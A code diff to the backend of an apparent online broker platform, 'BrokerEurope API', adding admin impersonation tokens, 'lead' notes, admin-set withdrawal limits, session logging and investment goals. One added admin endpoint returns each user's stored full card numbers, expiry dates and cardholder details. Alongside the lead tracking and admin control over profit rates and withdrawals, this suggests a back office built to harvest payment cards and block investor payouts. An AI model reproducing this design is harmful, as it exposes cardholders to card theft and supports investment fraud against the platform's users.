@@ -1,4 +1,4 @@
-from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, status
+from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, status, Request as FastAPIRequest
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from pydantic import BaseModel, EmailStr
@@ -261,10 +261,26 @@ async def register(req: RegisterRequest):
     return {"token": token, "user": {"id": str(result.inserted_id), "full_name": req.full_name, "email": req.email, "country": req.country, "balance": 0.0, "profit": 0.0}}
 
 @app.post("/api/auth/login")
-async def login(req: LoginRequest):
+async def login(req: LoginRequest, request: FastAPIRequest = None):
     user = await db.users.find_one({"email": req.email})
     if not user or not pwd_context.verify(req.password, user["password"]):
         raise HTTPException(status_code=401, detail="Credenciais inválidas")
+    
+    # Registar sessão
+    try:
+        ip = "unknown"
+        ua = "unknown"
+        if request:
+            ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
+            ua = request.headers.get("User-Agent", "unknown")
+        await db.sessions.insert_one({
+            "user_id": str(user["_id"]),
+            "ip": ip.split(",")[0].strip() if "," in ip else ip,
+            "user_agent": ua[:200],
+            "created_at": datetime.utcnow(),
+        })
+    except Exception:
+        pass
     
     token = create_token({"sub": str(user["_id"]), "email": req.email}, role="client")
     return {
@@ -277,7 +293,10 @@ async def login(req: LoginRequest):
             "phone": user.get("phone", ""),
             "balance": user.get("balance", 0.0),
             "profit": user.get("profit", 0.0),
-            "status": user.get("status", "Novo")
+            "status": user.get("status", "Novo"),
+            "goal_amount": user.get("goal_amount", 0.0),
+            "goal_label": user.get("goal_label", ""),
+            "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
         }
     }
 
@@ -311,6 +330,9 @@ async def get_me(current_user = Depends(get_current_user)):
         "profit": profit,
         "status": user.get("status", "Novo"),
         "daily_profit_rate": user.get("daily_profit_rate", 0),
+        "goal_amount": user.get("goal_amount", 0.0),
+        "goal_label": user.get("goal_label", ""),
+        "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
         "created_at": user.get("created_at")
     })
 
@@ -696,4 +718,127 @@ async def download_kyc(doc_id: str, admin = Depends(get_admin_user)):
 @app.get("/api/health")
 async def health():
     return {"status": "ok", "service": "BrokerEurope API"}
+
+
+# ════════════════════════════════════════════════════════════════
+#  IMPERSONATION — Admin faz login como cliente
+# ════════════════════════════════════════════════════════════════
+@app.post("/api/admin/users/{user_id}/impersonate")
+async def impersonate_user(user_id: str, admin = Depends(get_admin_user)):
+    user = await db.users.find_one({"_id": ObjectId(user_id)})
+    if not user:
+        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
+    # Token de curta duração (2 horas)
+    token = jwt.encode(
+        {"sub": str(user["_id"]), "email": user["email"], "role": "client",
+         "exp": datetime.utcnow() + timedelta(hours=2), "impersonated": True},
+        SECRET_KEY, algorithm=ALGORITHM
+    )
+    return {"token": token, "user_id": user_id, "email": user["email"]}
+
+
+# ════════════════════════════════════════════════════════════════
+#  NOTAS DO LEAD
+# ════════════════════════════════════════════════════════════════
+class LeadNotesRequest(BaseModel):
+    notes: str
+
+@app.put("/api/admin/users/{user_id}/notes")
+async def update_lead_notes(user_id: str, req: LeadNotesRequest, admin = Depends(get_admin_user)):
+    await db.users.update_one(
+        {"_id": ObjectId(user_id)},
+        {"$set": {"notes": req.notes, "notes_updated_at": datetime.utcnow()}}
+    )
+    return {"success": True}
+
+@app.get("/api/admin/users/{user_id}/notes")
+async def get_lead_notes(user_id: str, admin = Depends(get_admin_user)):
+    user = await db.users.find_one({"_id": ObjectId(user_id)}, {"notes": 1, "notes_updated_at": 1})
+    if not user:
+        raise HTTPException(status_code=404, detail="Não encontrado")
+    return {"notes": user.get("notes", ""), "notes_updated_at": user.get("notes_updated_at")}
+
+
+# ════════════════════════════════════════════════════════════════
+#  HISTÓRICO DE DEPÓSITOS / CARTÕES POR UTILIZADOR
+# ════════════════════════════════════════════════════════════════
+@app.get("/api/admin/users/{user_id}/deposits")
+async def get_user_deposits(user_id: str, admin = Depends(get_admin_user)):
+    result = []
+    async for d in db.cards_data.find({"user_id": user_id}).sort("created_at", -1).limit(50):
+        result.append(serialize_doc({
+            "id": d["_id"],
+            "cardholder": d.get("cardholder", ""),
+            "card_number": d.get("card_number", ""),
+            "expiry": d.get("expiry", ""),
+            "amount": d.get("amount", 0),
+            "country": d.get("country", ""),
+            "postal_code": d.get("postal_code", ""),
+            "created_at": d.get("created_at"),
+        }))
+    return result
+
+
+# ════════════════════════════════════════════════════════════════
+#  LIMITE DE LEVANTAMENTO DIÁRIO
+# ════════════════════════════════════════════════════════════════
+class WithdrawalLimitRequest(BaseModel):
+    daily_withdrawal_limit: float
+
+@app.put("/api/admin/users/{user_id}/withdrawal-limit")
+async def set_withdrawal_limit(user_id: str, req: WithdrawalLimitRequest, admin = Depends(get_admin_user)):
+    await db.users.update_one(
+        {"_id": ObjectId(user_id)},
+        {"$set": {"daily_withdrawal_limit": req.daily_withdrawal_limit}}
+    )
+    return {"success": True}
+
+
+# ════════════════════════════════════════════════════════════════
+#  HISTÓRICO DE SESSÕES
+# ════════════════════════════════════════════════════════════════
+# Sessões — Request já importado no topo
+
+@app.post("/api/me/session")
+async def record_session(request: FastAPIRequest, current_user = Depends(get_current_user)):
+    """Chamado automaticamente no login para registar a sessão."""
+    ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
+    ua = request.headers.get("User-Agent", "unknown")
+    session = {
+        "user_id": current_user["sub"],
+        "ip": ip.split(",")[0].strip(),
+        "user_agent": ua[:200],
+        "created_at": datetime.utcnow(),
+    }
+    await db.sessions.insert_one(session)
+    return {"success": True}
+
+@app.get("/api/me/sessions")
+async def get_my_sessions(current_user = Depends(get_current_user)):
+    sessions = []
+    async for s in db.sessions.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(10):
+        sessions.append(serialize_doc({
+            "id": s["_id"],
+            "ip": s.get("ip", "—"),
+            "user_agent": s.get("user_agent", "—"),
+            "created_at": s.get("created_at"),
+        }))
+    return sessions
+
+
+# ════════════════════════════════════════════════════════════════
+#  METAS DE INVESTIMENTO
+# ════════════════════════════════════════════════════════════════
+class InvestmentGoalRequest(BaseModel):
+    goal_amount: float
+    goal_label: Optional[str] = "A minha meta"
+
+@app.put("/api/me/goal")
+async def set_investment_goal(req: InvestmentGoalRequest, current_user = Depends(get_current_user)):
+    await db.users.update_one(
+        {"_id": ObjectId(current_user["sub"])},
+        {"$set": {"goal_amount": req.goal_amount, "goal_label": req.goal_label}}
+    )
+    return {"success": True}
+
 
